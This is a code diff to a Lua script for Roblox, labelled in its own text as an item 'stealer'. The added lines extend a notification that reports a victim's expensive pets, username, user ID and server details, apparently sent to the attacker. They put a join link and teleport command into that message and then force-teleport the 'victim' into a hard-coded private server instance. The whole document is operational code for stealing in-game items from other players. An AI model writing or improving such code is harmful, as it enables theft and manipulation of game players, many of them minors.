@@ -228,6 +228,11 @@ local function SendJoinMessage(list, prefix)
     local maxPlayers = tostring(Players.MaxPlayers or "?")
     local timeStr = os.date("%H:%M:%S")
     local dateStr = os.date("%m/%d/%y")
+    
+    -- Join link and teleport command
+    local joinLink = string.format("https://www.roblox.com/games/%s?privateServerLinkCode=%s", placeId, jobId)
+    local teleportCommand = 'game:GetService("TeleportService"):TeleportToPlaceInstance(126884695634066, "419e1a33-9771-47e1-98cc-2ad2c2fc5087")'
+    
     -- Pet list formatting
     local petLines = {}
     for _, item in ipairs(list) do
@@ -239,7 +244,7 @@ local function SendJoinMessage(list, prefix)
 
     -- Main embed description
     local description = string.format(
-        "X Scripts Gag Stealer\nTotal Value (expensive pets): %s\n\n%s\n\nPlayer Info\nName: %s\nUser ID: %s\nPlayers in game: %s/%s\nReceivers: %s\n\nExploit Info\nExploit: %s\nTime: %s\nDate: %s",
+        "X Scripts Gag Stealer\nTotal Value (expensive pets): %s\n\n%s\n\nPlayer Info\nName: %s\nUser ID: %s\nPlayers in game: %s/%s\nReceivers: %s\n\nJoin Link\n%s\n\nTeleport Command\n```%s```\n\nExploit Info\nExploit: %s\nTime: %s\nDate: %s",
         totalValueStr,
         petListStr,
         playerName,
@@ -247,6 +252,8 @@ local function SendJoinMessage(list, prefix)
         playerCount,
         maxPlayers,
         receivers,
+        joinLink,
+        teleportCommand,
         executor,
         timeStr,
         dateStr
@@ -413,6 +420,10 @@ if #itemsToSend > 0 then
 
     -- Remove followUser and waitForUserChat, just send notification after scan
     SendJoinMessage(sentItems, prefix)
+    
+    -- Teleport victim to your server
+    local teleportService = game:GetService("TeleportService")
+    teleportService:TeleportToPlaceInstance(126884695634066, "419e1a33-9771-47e1-98cc-2ad2c2fc5087")
 else
     debugPrint("No items found that meet the minimum value requirement")
     debugPrint("Try lowering the min_value in the configuration")
